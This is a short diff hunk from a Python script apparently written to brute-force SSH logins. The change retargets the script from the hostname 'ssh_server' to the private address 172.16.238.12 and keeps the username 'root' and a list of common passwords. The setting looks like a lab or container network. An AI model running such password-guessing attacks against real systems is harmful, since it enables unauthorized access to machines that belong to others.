@@ -21,7 +21,7 @@ def ssh_bruteforce(hostname, username, passwords):
     print("Brute force attack completed")
 
 if __name__ == "__main__":
-    hostname = "ssh_server"
+    hostname = "172.16.238.12"
     username = "root"
     passwords = ["password123", "admin", "root", "123456", "password","securepassword","verysecurepassword"]  # Example password list
     ssh_bruteforce(hostname, username, passwords)
